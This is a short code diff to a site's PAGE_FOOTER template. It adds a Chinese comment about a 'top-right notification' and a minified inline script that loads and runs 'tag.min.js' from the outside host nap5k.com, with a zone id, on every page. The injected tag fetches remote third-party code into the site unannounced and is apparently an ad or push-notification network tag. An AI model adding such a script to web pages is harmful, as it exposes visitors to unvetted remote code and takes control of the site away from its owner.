@@ -145,4 +145,6 @@ export const PAGE_FOOTER = `
       }
     }
   </style>
+  <!-- 页面右上角通知 -->
+  <script>(function(s){s.dataset.zone='10621634',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 `;
